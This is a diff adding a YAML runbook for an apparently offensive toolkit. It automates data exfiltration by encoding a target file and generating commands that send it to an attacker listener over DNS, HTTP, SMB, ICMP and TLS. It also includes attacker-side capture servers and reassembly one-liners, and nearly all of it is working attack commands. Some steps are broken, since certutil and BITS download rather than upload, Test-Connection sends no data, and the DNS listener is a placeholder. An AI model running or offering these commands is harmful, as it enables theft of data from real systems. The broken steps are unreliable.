@@ -1,0 +1,322 @@
+# v2 runbook — Data exfiltration techniques
+name: "Data Exfiltration"
+description: "Exfiltrate data via DNS, HTTP/S, SMB, ICMP, and other covert channels — including multi-protocol DNS exfil controller, HTTP beaconing, and SMB named pipes"
+version: "2.0"
+
+vars:
+  exfil_data: ""
+  exfil_file: ""
+  exfil_protocol: "dns"
+  listener_ip: ""
+  listener_domain: ""
+  exfil_dir: ""
+  chunk_size: 200
+  beacon_interval: 60
+
+steps:
+  - id: preamble
+    type: log
+    message: "Data exfiltration — protocol:{exfil_protocol} target:{listener_ip} (case: {case_id})"
+
+  # Phase 1: Preparation — encode & chunk
+  - id: prepare
+    name: "Prepare data for exfiltration"
+    type: sequential
+    steps:
+      - id: encode_b64
+        name: "Base64 encode data"
+        tool: python3
+        args:
+          - -c
+          - |
+            import base64, os
+            data=open('{exfil_file}','rb').read() if os.path.exists('{exfil_file}') else bytes('{exfil_data}','utf-8')
+            encoded=base64.b64encode(data).decode()
+            chunks=[encoded[i:i+{chunk_size}] for i in range(0,len(encoded),{chunk_size})]
+            open('{case_dir}/exfil_encoded.txt','w').write(encoded)
+            print(f'Encoded: {len(encoded)} chars in {len(chunks)} chunks of {chunk_size}')
+        timeout: 15
+        artifacts: ["{case_dir}/exfil_encoded.txt"]
+
+      - id: gen_manifest
+        name: "Generate exfil manifest"
+        tool: python3
+        args:
+          - -c
+          - |
+            import json, os
+            from datetime import datetime, timezone
+            manifest={
+             'file': '{exfil_file}',
+             'size': os.path.getsize('{exfil_file}') if os.path.exists('{exfil_file}') else len('{exfil_data}'),
+             'chunks': len(open('{case_dir}/exfil_encoded.txt').read()) // {chunk_size} + 1,
+             'protocol': '{exfil_protocol}',
+             'target': '{listener_ip}',
+             'timestamp': datetime.now(timezone.utc).isoformat()
+            }
+            json.dump(manifest,open('{case_dir}/exfil_manifest.json','w'),indent=2)
+            print(json.dumps(manifest,indent=2))
+        timeout: 15
+
+  # Phase 2: DNS exfiltration
+  - id: dns_exfil
+    name: "DNS exfiltration"
+    type: sequential
+    steps:
+      - id: dns_server_start
+        name: "Start DNS exfil listener"
+        tool: python3
+        args:
+          - -c
+          - |
+            from http.server import HTTPServer, BaseHTTPRequestHandler
+            open('{case_dir}/dns_listener.log','w').write('DNS exfil listener placeholder')
+            print('Start DNS exfil via: python3 dns_exfil_controller/python/dns_exfiltration.py --server')
+            print('Or: go run dns_exfil_controller/main.go')
+        timeout: 15
+        artifacts: ["{case_dir}/dns_listener_start.txt"]
+
+      - id: dns_exfil_cmd
+        name: "DNS exfil command generation"
+        tool: python3
+        args:
+          - -c
+          - |
+            encoded=open('{case_dir}/exfil_encoded.txt').read()
+            domain='{listener_domain}' or 'exfil.example.com'
+            chunks=[encoded[i:i+40] for i in range(0,len(encoded),40)]
+            print('=== DNS Exfiltration Commands ===')
+            print(f'Target domain: {domain}')
+            print()
+            print('# Linux (dig)')
+            for i,c in enumerate(chunks[:20]):
+             print(f'dig +short {i}.{c}.{domain} @{listener_ip}')
+            if len(chunks)>20: print(f'... and {len(chunks)-20} more chunks')
+            print()
+            print('# PowerShell')
+            print(f'for ($i=0; $i -lt {len(chunks)}; $i++){{ Resolve-DnsName "$i.$chunks[$i].{domain}" -Server {listener_ip} }}')
+            print()
+            print('# Python DNS exfil controller')
+            print(f'python3 dns_exfil_controller/python/dns_exfiltration.py --file {exfil_file} --server {listener_ip} --domain {domain}')
+            print()
+            print('# Go DNS exfil controller')
+            print(f'go run dns_exfil_controller/main.go -file {exfil_file} -server {listener_ip} -domain {domain}')
+            print()
+            print('# Nim DNS exfil controller')
+            print(f'./dns_exfil_controller/nim/dns_exfiltration.nim --file {exfil_file} --server {listener_ip}')
+            print()
+            print('# Bash DNS exfil')
+            print(f'./dns_exfil_controller/bash/dns_exfiltration.sh --file {exfil_file} --server {listener_ip}')
+        timeout: 15
+        artifacts: ["{case_dir}/dns_exfil_commands.txt"]
+
+  # Phase 3: HTTP/S exfiltration
+  - id: http_exfil
+    name: "HTTP exfiltration"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: http_server
+        name: "Start HTTP exfil listener"
+        tool: python3
+        args:
+          - -c
+          - |
+            print("=== HTTP Exfil Listener ===")
+            print("Run this on your attacker machine:")
+            print()
+            print("cat > /tmp/http_exfil_server.py << 'EOF'")
+            print("from http.server import HTTPServer, BaseHTTPRequestHandler")
+            print("class ExfilHandler(BaseHTTPRequestHandler):")
+            print(" def do_POST(self):")
+            print("  length=int(self.headers.get('Content-Length',0))")
+            print("  data=self.rfile.read(length)")
+            print('  with open("captured.txt","a") as f:')
+            print("   f.write(data.decode()+chr(10))")
+            print("  self.send_response(200)")
+            print("  self.end_headers()")
+            print("HTTPServer(('0.0.0.0',8080),ExfilHandler).serve_forever()")
+            print("EOF")
+            print(f"python3 /tmp/http_exfil_server.py &")
+        timeout: 15
+
+      - id: http_curl
+        name: "Curl exfil commands"
+        tool: python3
+        args:
+          - -c
+          - |
+            encoded=open('{case_dir}/exfil_encoded.txt').read()
+            print('=== HTTP Exfiltration Commands ===')
+            print()
+            print(f'# POST exfil (file content)')
+            print(f'curl -X POST --data-binary @{exfil_file} http://{listener_ip}:8080/exfil')
+            print()
+            print(f'# Base64 POST header exfil')
+            encoded_short=encoded[:100]
+            print(f'curl -H "X-Exfil: {encoded_short}" http://{listener_ip}:8080/')
+            print()
+            print(f'# Windows certutil (HTTPS)')
+            print(f'certutil -urlcache -f http://{listener_ip}:8080/exfil {case_dir}\out.txt')
+            print()
+            print(f'# PowerShell web exfil')
+            print(f'Invoke-WebRequest -Uri http://{listener_ip}:8080/exfil -Method POST -Body (Get-Content {exfil_file} -Raw)')
+            print(f'Start-BitsTransfer -Source http://{listener_ip}:8080/exfil -Destination {case_dir}\out.txt')
+        timeout: 15
+
+  # Phase 4: SMB exfiltration
+  - id: smb_exfil
+    name: "SMB exfiltration"
+    type: parallel
+    steps:
+      - id: smb_server
+        name: "Setup SMB share (Impacket)"
+        tool: python3
+        args:
+          - -c
+          - |
+            print('=== SMB Exfiltration Setup ===')
+            print()
+            print(f'# Attacker: Start SMB server with Impacket')
+            print(f'impacket-smbserver -smb2support share . {listener_ip}')
+            print()
+            print(f'# Target: PowerShell SMB copy')
+            print(f'Copy-Item -Path "{exfil_file}" -Destination \\\\{listener_ip}\share\')
+            print()
+            print(f'# SMB named pipe exfil')
+            print(f'copy "{exfil_file}" \\\\{listener_ip}\share\exfil_data.bin')
+            print()
+            print(f'# Net use with credentials (if needed)')
+            print(f'net use \\\\{listener_ip}\share /user:admin Password123!')
+        timeout: 15
+        artifacts: ["{case_dir}/smb_exfil_commands.txt"]
+
+  # Phase 5: ICMP exfiltration
+  - id: icmp_exfil
+    name: "ICMP exfiltration"
+    type: sequential
+    steps:
+      - id: icmp_listener
+        name: "Setup ICMP exfil listener (instructions)"
+        tool: python3
+        args:
+          - -c
+          - |
+            print("=== ICMP Exfil Listener ===")
+            print("Run this on your attacker machine (requires root):")
+            print()
+            print("cat > /tmp/icmp_listener.py << 'EOF'")
+            print("import socket")
+            print("s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)")
+            print("while True:")
+            print(" packet,addr=s.recvfrom(65535)")
+            print(' if packet[20]==8:')
+            print('  with open("icmp_captured.txt","ab") as f:')
+            print("   f.write(packet[28:]+chr(10).encode())")
+            print("  print(f'Got {len(packet[28:])}B from {addr[0]}')")
+            print("EOF")
+            print(f"sudo python3 /tmp/icmp_listener.py")
+        timeout: 15
+
+      - id: icmp_send
+        name: "ICMP exfil commands"
+        tool: python3
+        args:
+          - -c
+          - |
+            encoded=open('{case_dir}/exfil_encoded.txt').read()
+            print('=== ICMP Exfiltration Commands ===')
+            print()
+            print('# Linux: Ping with data payload')
+            chunk=encoded[:56]
+            print(f'ping -p {chunk.encode().hex()} -c 1 {listener_ip}')
+            print()
+            print('# PowerShell ICMP exfil')
+            print(f'Test-Connection -ComputerName {listener_ip} -Count 1')
+            print()
+            print('# Note: ICMP exfil requires raw sockets (admin/root)')
+        timeout: 15
+
+  # Phase 6: Covert TLS exfiltration
+  - id: tls_exfil
+    name: "TLS covert exfiltration"
+    type: sequential
+    steps:
+      - id: tls_joke
+        name: "TLS/SSL exfil via certificate"
+        tool: python3
+        args:
+          - -c
+          - |
+            print('=== TLS Covert Channel ===')
+            print()
+            print('# Embed data in TLS certificate fields (CN, O, OU)')
+            print('# OpenSSL config with exfil data in CN field')
+            print('subjectAltName=DNS:exfil.{listener_domain}')
+            print()
+            print('# Use openssl s_server to capture TLS handshakes')
+            print(f'openssl s_server -key key.pem -cert cert.pem -accept 443 -www')
+            print()
+            print('# Data embedded in HTTP Host header over TLS')
+            print(f'curl -k --resolve exfil.{listener_domain}:443:{listener_ip} -H "Host: exfil-data.{listener_domain}" https://{listener_ip}/')
+        timeout: 15
+
+  # Phase 7: Receive & reassemble
+  - id: receive
+    name: "Receive and reassemble exfiltrated data"
+    type: sequential
+    steps:
+      - id: reassemble
+        name: "Reassembly guide"
+        tool: python3
+        args:
+          - -c
+          - |
+            print('=== Data Reassembly ===')
+            print()
+            print('# DNS reassembly')
+            print('grep -oP "[a-f0-9]+\.exfil" dns_log.txt | cut -d. -f1,2 | sort -t. -k1n | cut -d. -f2 | tr -d "\\n" | base64 -d > recovered_file')
+            print()
+            print('# HTTP reassembly')
+            print('cat http_exfil_captured.txt | sort | base64 -d > recovered_file')
+            print()
+            print('# SMB reassembly')
+            print(f'copy \\\\{listener_ip}\share\exfil_data.bin recovered_file')
+            print()
+            print('# ICMP reassembly')
+            print('cat icmp_exfil_captured.txt | base64 -d > recovered_file')
+            print()
+            print('# Verify integrity')
+            print(f'sha256sum recovered_file {exfil_file} 2>/dev/null || certutil -hashfile recovered_file SHA256')
+        timeout: 15
+
+  # Phase 8: Report
+  - id: report
+    name: "Generate exfiltration report"
+    type: report
+    format: markdown
+    title: "Data Exfiltration Report"
+    output: "{case_dir}/exfiltration-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Listener: {listener_ip}\n- Domain: {listener_domain}\n- Protocol: {exfil_protocol}\n- Case: {case_id}"
+      - heading: "Data Prepared"
+        body: "- File: {exfil_file}\n- Manifest: {case_dir}/exfil_manifest.json\n- Encoded: {case_dir}/exfil_encoded.txt"
+      - heading: "DNS Exfiltration"
+        body: "- Commands: {case_dir}/dns_exfil_commands.txt\n- Listener: {case_dir}/dns_listener_start.txt"
+      - heading: "HTTP Exfiltration"
+        body: "- Server: {case_dir}/http_exfil_server.py\n- Commands: {case_dir}/http_exfil_commands.txt"
+      - heading: "SMB Exfiltration"
+        body: "- Commands: {case_dir}/smb_exfil_commands.txt"
+      - heading: "ICMP Exfiltration"
+        body: "- Listener: {case_dir}/icmp_exfil_listener.py\n- Commands: {case_dir}/icmp_exfil_commands.txt"
+      - heading: "TLS Exfiltration"
+        body: "- Commands: {case_dir}/tls_exfil_commands.txt"
+      - heading: "Reassembly"
+        body: "- Guide: {case_dir}/exfil_reassembly.txt"
+
+postflight:
+  - id: done
+    type: notify
+    level: info
+    message: "Data exfiltration runbook complete — {case_dir}"
